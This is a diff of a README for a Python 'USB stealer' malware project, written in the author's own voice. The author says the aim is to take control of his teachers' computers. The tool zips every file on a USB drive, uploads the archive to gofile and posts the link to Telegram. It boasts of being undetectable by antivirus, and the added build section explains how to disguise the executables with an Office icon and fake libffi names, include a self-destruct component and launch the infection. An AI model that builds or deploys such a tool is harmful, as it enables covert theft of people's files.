@@ -7,6 +7,22 @@ USB STEALER TELEGRAM 📦📨
 > ## story🎴 ##
 I needed a virus to get control of my teachers.
 
+
+> ## Picture 📸 ##
+
+start :
+ ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/1b6ea90f-6c9c-4538-8a81-9abefc69d769)
+
+launcher :
+![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/befc0edc-10b4-4dfe-9450-ecfaa170d84c)
+
+Package 📦:
+![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/f12adc42-e63b-4642-bb4b-70ec2cf9ac77)
+
+Autodestroy💥:
+![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/dceb3675-dc5b-44be-9af9-f80a5e21b33c)
+
+
 > ## Information🔍 ##
 I've created a python program consisting of three scripts to send all the data on a USB flash drive in a zip file to telegram. 
 
@@ -16,9 +32,9 @@ I've created a python program consisting of three scripts to send all the data o
 >The second script will upload the zip file to gofile thanks to : @khodekhadem https://github.com/j0rd1s3rr4n0/FileUploader/tree/main/GoFIle
 
 >And the third script will send the file link to telegram.
-![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/befc0edc-10b4-4dfe-9450-ecfaa170d84c)
 
->🔥TOTAL FUD🔥
+
+>🔥TOTAL FUD🔥 and anonyme
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/1f209790-90b2-4f43-a03b-60194f2a0ae2)
 
 
@@ -34,6 +50,24 @@ The principle of this virus is that it is undetectable by antivirus software and
 To get an .exe file instead of the used python: auto-py-to-exe https://pypi.org/project/auto-py-to-exe/
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/3cece418-262f-452a-8c72-445970280e21)
 
+
+>## Build👩‍💻##
+To create the virus, you'll need to modify the bots and main files in python to enter your telegram connection keys. once modified, you'll compile them with auto-py-to-exe. for main.py use the office icon and for the bot files rename them with the following names: 
+
+chrome >> libffi-26.exe  
+firefox >> libffi-25.exe  
+install >> libffi-13.exe
+autodestroy >> libffi-14.exe
+
+then use ps1 to exe to convert the autodestroy.ps1 file and rename it to driver.exe. your project should look like this:
+![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/e73ba36d-5be8-46eb-804c-4ee2f7a04b99)
+in folder data :
+![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/1fc978b3-e884-48ac-a36d-485e467785c9)
+in folder shorcut :
+![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/a0984953-cb11-4463-a2f9-048302c97827)
+
+
+To start the infection, just run Pyth0n.exe.
 
 > ## Bug🦠 ##
 
